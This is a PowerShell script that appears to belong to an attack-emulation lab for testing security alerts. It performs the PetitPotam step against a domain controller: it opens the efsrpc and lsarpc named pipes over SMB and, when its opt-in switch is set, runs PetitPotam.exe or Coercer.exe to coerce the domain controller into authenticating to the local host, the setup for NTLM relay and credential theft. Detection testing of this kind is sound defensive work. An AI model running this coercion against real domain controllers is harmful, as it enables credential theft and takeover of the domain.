<#
    Stage 4 - Credential Access : EFSRPC coercion (PetitPotam)
    =========================================================
    The attacker coerces the domain controller into authenticating via the
    Encrypting File System Remote protocol (MS-EFSR) - the PetitPotam step that
    feeds NTLM relay to AD CS for credential theft.

      EAL alert : 'Suspicious Encrypting File System Remote call (EFSRPC) to
                   domain controller' (rule 82a37634)
      ATT&CK    : Lateral Movement / Credential Access (TA0008/TA0006) /
                  Pass the Hash (T1550.002), Forced Authentication (T1187)

    NOTE: the exact EFSRPC call needs PetitPotam.exe / Impacket. Native
    PowerShell opens the SMB named pipes it rides on (efsrpc/lsarpc), which still
    generates MSRPC traffic to the DC. Drop PetitPotam.exe in scripts\tools\.
#>
param([switch]$DryRun,[switch]$EnableRealExploits)
. "$PSScriptRoot\..\config\lab-config.ps1"
. "$PSScriptRoot\_exploit.ps1"
$cfg = $Global:EalDemo
if ($DryRun) { $cfg.DryRun = $true }
if ($EnableRealExploits) { $cfg.EnableRealExploits = $true }

$dc = $cfg.DomainController
Write-Stage "STAGE 4 (Credential Access): EFSRPC named-pipe access to DC $dc" "INFO"
foreach ($p in @("IPC$", "pipe\efsrpc", "pipe\lsarpc")) {
    $unc = "\\$dc\$p"
    if ($cfg.DryRun) { Write-Host "  DRY: open $unc (EFSRPC/LSARPC over SMB)"; continue }
    try {
        & net use $unc 2>$null | Out-Null
        Write-Stage "  Opened $unc (MSRPC/SMB traffic to DC generated)" "OK"
        & net use $unc /delete /y 2>$null | Out-Null
    } catch { Write-Stage "  $unc access failed (traffic still sent): $($_.Exception.Message)" "WARN" }
    Start-Sleep -Milliseconds $cfg.DelayBetweenReqMs
}
$helper = Join-Path $PSScriptRoot "tools\PetitPotam.exe"
if (Test-Path $helper) { Write-Stage "  PetitPotam found - exact coercion: $helper <listener> $dc" "INFO" }
else { Write-Stage "  (For the exact EFSRPC coercion, place PetitPotam.exe in scripts\tools\)" "INFO" }

# Opt-in: fire the exact EFSRPC coercion via an operator-supplied tool.
# PetitPotam.exe <listener> <target>  (listener = this host, target = the DC).
Invoke-RealExploit -Name 'EFSRPC/PetitPotam coercion' `
    -ToolCandidates @('PetitPotam.exe','petitpotam.exe','Coercer.exe') `
    -TrafficNote 'SMB named-pipe traffic to the DC was sent.' `
    -Run { param($t) & $t $env:COMPUTERNAME $cfg.DomainController }

Write-Stage "STAGE 4 done. Expect EAL: 'Suspicious EFSRPC to domain controller' (rule 82a37634)." "OK"
